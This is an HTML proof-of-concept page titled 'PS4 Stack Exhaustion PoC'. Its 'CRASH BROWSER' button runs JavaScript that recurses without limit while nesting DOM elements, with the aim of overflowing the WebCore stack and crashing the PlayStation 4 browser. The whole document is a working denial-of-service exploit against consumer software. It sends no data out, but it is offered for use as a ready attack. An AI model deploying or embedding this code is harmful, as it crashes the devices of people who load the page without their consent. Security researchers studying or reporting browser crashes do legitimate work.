<!DOCTYPE html>
<html>
<head>
    <title>PS4 DoS PoC</title>
</head>
<body>
    <h1>PS4 Stack Exhaustion PoC</h1>
    <button onclick="crashMe()" style="font-size:30px; padding:20px;">CRASH BROWSER</button>
    <div id="status">Waiting...</div>

    <script>
        function crashMe() {
            document.getElementById('status').innerText = "Flooding Stack...";
            
            setTimeout(() => {
                // Minimal reproduction case for Stack Overflow
                let root = document.createElement('div');
                document.body.appendChild(root);
                
                function dive() {
                    // Create nested div
                    let child = document.createElement('div');
                    // Force a layout calc to ensure WebCore stack usage
                    child.innerText = "."; 
                    root.appendChild(child);
                    root = child;
                    
                    // Recursive call without effective exit condition for PS4 stack size
                    dive(); 
                }
                
                try {
                    dive();
                } catch(e) {
                    // If the browser was secure, it would land here.
                    document.getElementById('status').innerText = "Failed: Browser caught the error.";
                }
            }, 100);
        }
    </script>
</body>
</html>
